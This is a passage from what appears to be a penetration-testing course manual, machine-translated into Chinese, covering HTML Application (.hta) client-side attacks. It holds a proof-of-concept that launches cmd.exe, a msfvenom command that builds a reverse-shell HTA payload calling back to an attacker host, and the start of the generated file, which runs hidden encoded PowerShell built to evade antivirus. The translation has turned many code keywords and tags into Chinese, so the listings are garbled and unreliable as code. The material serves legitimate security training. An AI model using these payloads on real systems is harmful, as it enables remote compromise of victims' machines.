<div style="position:absolute;top:119815;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">3. 下载</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Fingerprint2</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">库并制作一个类似于客户端中显示的网页</font></font></nobr></div>
<div style="position:absolute;top:119834;left:145"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">指纹部分。</font><font style="vertical-align: inherit;">从您的 Windows 10 实验室机器浏览网页并重复</font></font></nobr></div>
<div style="position:absolute;top:119853;left:145"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在 Kali 上收集 JavaScript 库提取的信息的步骤</font></font></nobr></div>
<div style="position:absolute;top:119873;left:145"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">网络服务器。</font></font></nobr></div>
</span></font>
<font size="4" color="#0070c0" face="Times"><span style="font-size:22px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:119910;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">13.2 利用 HTML 应用程序</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:119952;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">将注意力转向特定的客户端攻击，我们将首先关注</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">HTML 应用程序</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">。</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">340</font></font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:120035;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">340 </font><font style="font-size:9px"><font style="vertical-align: inherit;">（微软，2011 年），https:</font></font><font style="vertical-align: inherit;"> //msdn.microsoft.com/en-us/library/ms536496 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">(VS.85).aspx</font></font></font></nobr></div>
</span></font>

<div style="position:absolute;top:120163;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="102"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 102 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:120196;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:121273;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:121273;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:121273;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">422</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:120292;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">如果创建的文件扩展名为 .hta 而不是 .html，Internet Explorer 将自动</font></font></nobr></div>
<div style="position:absolute;top:120311;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">将其解释为 HTML 应用程序并提供使用 mshta.exe 程序执行它的能力。</font></font></nobr></div>
<div style="position:absolute;top:120344;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">HTML 应用程序的目的是允许直接从</font></font></nobr></div>
<div style="position:absolute;top:120363;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Internet Explorer，而不是下载并手动运行可执行文件。</font><font style="vertical-align: inherit;">既然这样冲突</font></font></nobr></div>
<div style="position:absolute;top:120383;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">由于 Internet Explorer 中的安全边界，HTML 应用程序始终在外部执行</font></font></nobr></div>
<div style="position:absolute;top:120402;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">由 Microsoft 签名的二进制文件 mshta.exe 提供的浏览器安全上下文。</font><font style="vertical-align: inherit;">如果用户允许</font></font></nobr></div>
<div style="position:absolute;top:120421;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">如果发生这种情况，攻击者可以使用该用户的权限执行任意代码，从而避免</font></font></nobr></div>
<div style="position:absolute;top:120441;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">通常由 Internet Explorer 施加的安全限制。</font></font></nobr></div>
<div style="position:absolute;top:120473;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">虽然这种攻击媒介仅对 Internet Explorer 有效，并且在某种程度上对 Microsoft Edge 有效，但它</font></font></nobr></div>
<div style="position:absolute;top:120493;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">仍然很有用，因为许多公司依赖 Internet Explorer 作为他们的主要浏览器。</font><font style="vertical-align: inherit;">而且，</font></font></nobr></div>
<div style="position:absolute;top:120512;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">此向量利用直接内置于 Windows 操作系统中的功能，更重要的是，</font></font></nobr></div>
<div style="position:absolute;top:120532;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">它与安全性较低的 Microsoft 旧版 Web 技术（例如 ActiveX）兼容。</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">341</font></font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:18px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:120566;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">13.2.1</font></font></i></nobr></div>
<div style="position:absolute;top:120566;left:217"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">探索 HTML 应用程序</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:120604;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">与 HTML 页面类似，典型的 HTML 应用程序包括</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">html</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">、</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">body</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">和</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">script</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">标签</font></font></nobr></div>
<div style="position:absolute;top:120623;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">通过 JavaScript 或 VBScript 代码。</font><font style="vertical-align: inherit;">但是，由于 HTML 应用程序是在外部执行的</font></font></nobr></div>
<div style="position:absolute;top:120642;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">浏览器我们可以自由使用通常被阻止的遗留和危险功能</font></font></nobr></div>
<div style="position:absolute;top:120662;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">浏览器。</font></font></nobr></div>
<div style="position:absolute;top:120695;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在这个例子中，我们将利用 ActiveXObjects，</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">342</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">，它可能（和危险地）提供</font></font></nobr></div>
<div style="position:absolute;top:120714;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">访问底层操作系统命令。</font><font style="vertical-align: inherit;">这可以通过 Windows 实现</font></font></nobr></div>
<div style="position:absolute;top:120734;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Script Host 功能或 WScript </font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">343</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">，特别是 Windows Script Host Shell 对象。</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">344</font></font></font></nobr></div>
<div style="position:absolute;top:120766;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">一旦我们实例化了一个 Windows Script Host Shell 对象，我们就可以</font><font style="vertical-align: inherit;">依次</font><font style="vertical-align: inherit;">调用它的</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">run</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">方法</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">345</font></font></font><font style="vertical-align: inherit;"></font></nobr></div>
<div style="position:absolute;top:120786;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在目标客户端机器上启动应用程序。</font></font></nobr></div>
<div style="position:absolute;top:120818;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">让我们创建一个简单的概念验证 HTML 应用程序来启动命令提示符：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:120853;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">&lt;html&gt;</font></font></nobr></div>
<div style="position:absolute;top:120870;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">&lt;身体&gt;</font></font></nobr></div>
<div style="position:absolute;top:120904;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">&lt;脚本&gt;</font></font></nobr></div>
</span></font>
<font size="3" color="#c00000" face="Times"><span style="font-size:11px;font-family:Times;color:#c00000">
<div style="position:absolute;top:120938;left:125"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">var c = 'cmd.exe'</font></font></b></nobr></div>
<div style="position:absolute;top:120955;left:125"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">new ActiveXObject('WScript.Shell').Run(c);</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:120989;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">&lt;/脚本&gt;</font></font></nobr></div>
<div style="position:absolute;top:121023;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">&lt;/正文&gt;</font></font></nobr></div>
<div style="position:absolute;top:121040;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">&lt;/html&gt;</font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:121115;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">341 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（维基百科，2019 年），https://en.wikipedia.org/wiki/ActiveX</font></font></font></nobr></div>
<div style="position:absolute;top:121135;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">342 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（微软，2017 年），https://developer.mozilla.org/en-US/docs/Web/JavaScript/Microsoft_Extensions/ActiveXObject</font></font></font></nobr></div>
<div style="position:absolute;top:121155;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">343 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（微软，2015 年），https://docs.microsoft.com/en-us/previous-versions/windows/internet-explorer/ie-developer/windows-</font></font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:121170;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">脚本/at5ydy31(v=vs.84)</font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:121189;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">344 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（微软，2015 年），https://docs.microsoft.com/en-us/previous-versions/windows/internet-explorer/ie-developer/windows-</font></font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:121204;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">脚本/aew9yb99(v=vs.84)</font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:121223;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">345 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（Adersoft，2019 年），http://www.vbsedit.com/html/6f28899c-d653-4555-8a59-49640b0e32ea.asp</font></font></font></nobr></div>
</span></font>

<div style="position:absolute;top:121351;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="103"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 103 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:121384;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:122461;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:122461;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:122461;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">423</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:121480;left:350"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 387 - 用于打开 cmd.exe 的 HTA 文件</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:121509;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们可以将此代码放在 Kali 机器上的一个文件中（poc.hta），并从 Apache 网络提供它</font></font></nobr></div>
<div style="position:absolute;top:121528;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">服务器。</font><font style="vertical-align: inherit;">一旦受害者使用 Internet Explorer 访问此文件，他们将看到</font></font></nobr></div>
<div style="position:absolute;top:121548;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">弹出对话框如图 243 所示。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:121895;left:394"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 243：第一个对话框</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:121926;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">此对话框是尝试执行 .hta 文件的结果。</font><font style="vertical-align: inherit;">选择</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">打开</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">将提示</font></font></nobr></div>
<div style="position:absolute;top:121946;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">附加对话框：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:122250;left:385"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 244：第二个对话框</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:122281;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">出现第二个对话框是因为 Internet Explorer 的沙箱保护，也称为</font></font></nobr></div>
<div style="position:absolute;top:122300;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">保护模式</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">，</font><font style="vertical-align: inherit;">默认启用</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">346</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">。</font><font style="vertical-align: inherit;">受害者可以选择</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">允许</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">以允许该操作，这将</font></font></nobr></div>
<div style="position:absolute;top:122320;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">执行 JavaScript 代码并启动 cmd.exe，如图 245 所示。</font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:122411;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">346 </font><font style="font-size:9px"><font style="vertical-align: inherit;">（微软，2011 年），https:</font></font><font style="vertical-align: inherit;"> //technet.microsoft.com/en-us/windows/bb250462 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">(v=vs.60)</font></font></font></nobr></div>
</span></font>

<div style="position:absolute;top:122539;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="104"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 104 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:122572;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:123649;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:123649;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:123649;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">424</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:123021;left:378"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 245：cmd.exe 打开</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:123053;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">当 mshta.exe 正在执行时，它会在我们的命令提示符后面打开一个额外的窗口。</font></font></nobr></div>
<div style="position:absolute;top:123072;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">为避免这种情况，我们可以更新我们的概念验证以使用</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">.close();</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">关闭此窗口</font><b><font style="font-size:13px"><font style="vertical-align: inherit;">；</font></font></b><font style="vertical-align: inherit;">目的</font></font></nobr></div>
<div style="position:absolute;top:123092;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">方法，如下图：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:123126;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">&lt;html&gt;</font></font></nobr></div>
<div style="position:absolute;top:123143;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">&lt;头&gt;</font></font></nobr></div>
<div style="position:absolute;top:123177;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">&lt;脚本&gt;</font></font></nobr></div>
<div style="position:absolute;top:123211;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">var c = 'cmd.exe'</font></font></nobr></div>
<div style="position:absolute;top:123228;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">new ActiveXObject('WScript.Shell').Run(c);</font></font></nobr></div>
<div style="position:absolute;top:123262;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">&lt;/脚本&gt;</font></font></nobr></div>
<div style="position:absolute;top:123296;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">&lt;/头&gt;</font></font></nobr></div>
<div style="position:absolute;top:123313;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">&lt;身体&gt;</font></font></nobr></div>
<div style="position:absolute;top:123347;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">&lt;脚本&gt;</font></font></nobr></div>
</span></font>
<font size="3" color="#c00000" face="Times"><span style="font-size:11px;font-family:Times;color:#c00000">
<div style="position:absolute;top:123381;left:125"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">self.close();</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:123415;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">&lt;/脚本&gt;</font></font></nobr></div>
<div style="position:absolute;top:123449;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">&lt;/正文&gt;</font></font></nobr></div>
<div style="position:absolute;top:123466;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">&lt;/html&gt;</font></font></nobr></div>
<div style="position:absolute;top:123485;left:349"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 388 - 更新的概念证明</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:123514;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">这已经展示了 HTA 漏洞利用的基本功能，但我们需要更努力地转变</font></font></nobr></div>
<div style="position:absolute;top:123534;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">这变成了攻击。</font><font style="vertical-align: inherit;">我们不使用</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Run</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">方法来启动 cmd.exe，而是转向</font></font></nobr></div>
<div style="position:absolute;top:123553;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">更强大的 PowerShell 框架。 </font></font></nobr></div>
</span></font>

<div style="position:absolute;top:123727;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="105"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 105 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:123760;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:124837;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:124837;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:124837;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">425</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:18px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:123856;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">13.2.2</font></font></i></nobr></div>
<div style="position:absolute;top:123856;left:217"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">HTA 攻击实战</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:123894;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们将使用</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">msfvenom</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">将我们的基本 HTML 应用程序变成攻击，依赖于</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">hta-psh</font></font></i></nobr></div>
<div style="position:absolute;top:123913;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">输出格式以创建基于 PowerShell 的 HTA 负载。</font><font style="vertical-align: inherit;">在清单 389 中，完全相反</font></font></nobr></div>
<div style="position:absolute;top:123933;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">生成 shell 负载并保存到文件 evil.hta 中。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:123967;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">sudo msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.4 LPORT=4444 -f</font></font></font></b></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:11px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:123984;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">hta-psh -o /var/www/html/evil.hta</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:124001;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">未选择平台，从有效负载中选择 Msf::Module::Platform::Windows</font></font></nobr></div>
<div style="position:absolute;top:124018;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">未选择 Arch，从有效载荷中选择 Arch: x86</font></font></nobr></div>
<div style="position:absolute;top:124036;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">未指定编码器或 badchars，输出原始负载</font></font></nobr></div>
<div style="position:absolute;top:124052;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">有效载荷大小：324 字节</font></font></nobr></div>
<div style="position:absolute;top:124069;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">hta-psh 文件的最终大小：6461 字节</font></font></nobr></div>
</span></font>
<font size="3" color="#c00000" face="Times"><span style="font-size:11px;font-family:Times;color:#c00000">
<div style="position:absolute;top:124086;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">另存为：/var/www/html/evil.hta</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:124105;left:313"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 389 - 使用 msfvenom 创建 HTA 负载</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:124135;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">让我们来看看清单 390 中生成的 .hta 文件，以更好地了解一切是如何工作的。</font></font></nobr></div>
<div style="position:absolute;top:124154;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">首先要注意的事情之一是变量名称已被随机化以欺骗</font></font></nobr></div>
<div style="position:absolute;top:124174;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">检测和杀毒软件。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:124208;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">sudo cat /var/www/html/evil.hta</font></font></font></b></nobr></div>
<div style="position:absolute;top:124226;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">&lt;脚本语言="VBScript"&gt;</font></font></nobr></div>
<div style="position:absolute;top:124243;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">window.moveTo -4000, -4000</font></font></nobr></div>
<div style="position:absolute;top:124259;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">设置 iKqr8BWFyuiK = CreateObject("Wscript.Shell")</font></font></nobr></div>
<div style="position:absolute;top:124276;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">设置 t6tI2tnp = CreateObject("Scripting.FileSystemObject")</font></font></nobr></div>
<div style="position:absolute;top:124293;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">对于 Split(iKqr8BWFyuiK.ExpandEnvironmentStrings("%PSModulePath%"),";") 中的每个路径</font></font></nobr></div>
<div style="position:absolute;top:124310;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">如果 t6tI2tnp.FileExists(path + "\..\powershell.exe") 然后</font></font></nobr></div>
</span></font>
<font size="3" color="#c00000" face="Times"><span style="font-size:11px;font-family:Times;color:#c00000">
<div style="position:absolute;top:124327;left:157"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">iKqr8BWFyuiK.Run "powershell.exe -nop -w hidden -e aQBmACgAWwBJAG4AdABQAHQAcg...</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
